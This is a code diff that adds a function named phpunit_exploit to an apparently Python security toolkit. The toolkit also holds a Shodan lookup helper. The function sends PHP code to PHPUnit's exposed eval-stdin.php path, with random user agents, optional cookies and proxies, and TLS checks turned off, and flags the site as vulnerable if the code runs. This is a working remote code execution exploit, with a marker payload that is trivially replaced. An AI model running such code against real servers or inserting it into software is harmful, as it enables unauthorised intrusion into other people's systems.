@@ -1178,3 +1178,23 @@ def shodan_report(ip,api_key,file_name="shodan_report"):
   return json.loads(r)
  except:
   return {}
+
+def phpunit_exploit(u,path='/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',user_agent=None,cookie=None,timeout=10,proxy=None):
+ if proxy:
+  proxy={'http':'http://'+proxy}
+ if u[len(u)-1]=='/':
+  u=u[0:len(u)-1]
+ if user_agent:
+  us=user_agent
+ else:
+  us=random.choice(ua)
+ hed={"User-Agent":us}
+ if cookie:
+  hed.update({"Cookie":cookie})
+ try:
+  r=requests.post(u+path,data="<?php echo 'This_is_vulnerable_site';?>",headers=hed,proxies=proxy,timeout=timeout, verify=False).text
+  if 'This_is_vulnerable_site' in r:
+   return True
+ except:
+  pass
+ return False
